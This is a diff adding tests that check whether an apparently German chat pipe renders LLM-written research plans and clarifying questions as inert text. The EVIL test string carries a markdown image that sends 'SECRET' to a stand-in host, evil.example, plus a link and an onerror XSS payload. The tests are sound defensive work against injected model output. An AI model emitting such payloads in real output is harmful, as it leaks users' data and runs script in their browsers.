@@ -634,3 +634,48 @@ def test_a_preset_model_skips_the_choice():
     clarify = next(c for c in calls if c[1] == "/clarify")
     assert clarify[2]["preset"] == "rechtsrecherche" and "suggest_preset" not in clarify[2]
     assert [q["data"]["questions"][0]["id"] for q in asked] == ["plan"]
+
+
+# ------------------------------------------------------- D8: LLM-written plan and questions render as plain text
+EVIL = (
+    "Plan ![x](https://evil.example/p?d=SECRET) [klick](https://evil.example/l) <img src=x onerror=alert(1)> **fett**"
+)
+
+
+def _html(markdown: str) -> str:
+    from markdown_it import MarkdownIt
+
+    return MarkdownIt("commonmark").render(markdown)
+
+
+def test_plan_from_the_llm_cannot_load_images_or_links():
+    mod = load_pipe()
+    plan = {
+        "title": EVIL,
+        "task_core": EVIL,
+        "parts": [{"id": "a", "title": EVIL, "goal": "Ziel\n\n# Überschrift " + EVIL}],
+        "sub_questions": [{"part": "a", "text": EVIL}],
+        "must_name": [EVIL],
+    }
+    html = _html(mod._render_plan(plan, "quick"))
+    assert "<img" not in html and "<a " not in html and "evil.example" in html  # shown as text
+    assert "<h1>" not in html and html.count("<strong>") == 3  # only the pipe's own bold: plan and part title, depth
+    # the chat title still comes from the plan title, without the escapes
+    prompt = "<chat_history>\nASSISTANT: " + mod._render_plan({**plan, "title": "Fasnacht *2026*"}, "quick")
+    out = mod.Pipe()._task_reply("title_generation", {"messages": [{"content": prompt}]})
+    assert json.loads(out)["title"] == "Fasnacht *2026*"
+
+
+def test_clarifying_questions_from_the_llm_are_plain_text():
+    mod = load_pipe()
+    pipe = mod.Pipe()
+
+    async def api(method, path, body=None):
+        return {"questions": [EVIL], "assumptions": [EVIL]}
+
+    pipe._api = api
+    out = asyncio.run(
+        pipe.pipe({"model": "x.grossrat", "messages": [{"role": "user", "content": "Frage"}]}, {"id": "u"})
+    )
+    html = _html(out)
+    assert "<img" not in html and "<a " not in html and "<strong>" not in html.split("Antworten Sie kurz")[0]
